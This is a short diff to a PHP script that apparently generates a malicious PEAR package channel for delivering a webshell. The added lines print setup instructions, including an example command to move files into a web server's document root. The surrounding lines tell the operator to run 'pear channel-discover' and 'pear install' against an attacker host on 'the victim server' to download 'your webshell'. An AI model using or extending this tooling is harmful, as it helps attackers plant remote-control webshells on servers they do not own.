@@ -277,8 +277,13 @@ print(PHP_EOL);
 print("\033[92mAll Done!\033[0m" . PHP_EOL);
 print(PHP_EOL);
 print("Now you should move all the files in `public_html' to the document root (like `/var/www/html/') of your web server." . PHP_EOL);
+print("For instance:" . PHP_EOL);
+print(PHP_EOL);
+print("\033[1mmv -i public_html/* /var/www/html/\033[0m" . PHP_EOL);
+print(PHP_EOL);
 print("After that, try to execute the following PEAR commands on the victim server and download your webshell." . PHP_EOL);
 print(PHP_EOL);
 print("\033[1mpear channel-discover $hostname\033[0m" . PHP_EOL);
 print("\033[1mpear install $channel_alias/$package_name\033[0m" . PHP_EOL);
+print(PHP_EOL);
 ?>
